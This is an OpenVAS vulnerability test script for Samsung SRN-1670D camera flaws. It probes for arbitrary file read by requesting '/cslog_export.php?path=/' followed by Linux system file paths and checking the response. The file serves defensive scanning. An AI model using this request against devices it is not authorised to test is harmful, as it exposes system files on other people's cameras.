###############################################################################
# OpenVAS Vulnerability Test
#
# Samsung SRN-1670D Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:samsung:web_viewer";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140510");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2017-11-16 14:07:32 +0700 (Thu, 16 Nov 2017)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2015-8279", "CVE-2015-8280", "CVE-2015-8281", "CVE-2017-16524");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Samsung SRN-1670D Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_samsung_web_viewer_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("samsung_webviewer/detected");

  script_tag(name:"summary", value:"Samsung SRN cameras are prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"Samsung SRN cameras are prone to multiple vulnerabilities:

  - Arbitrary file read (CVE-2015-8279)

  - User enumeration (CVE-2015-8280)

  - Weak firmware encryption (CVE-2015-8281)

  - Arbitrary file read and upload (CVE-2017-16524)");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://blog.emaze.net/2016/01/multiple-vulnerabilities-samsung-srn.html");
  script_xref(name:"URL", value:"https://github.com/realistic-security/CVE-2017-16524");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = '/cslog_export.php?path=/' + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
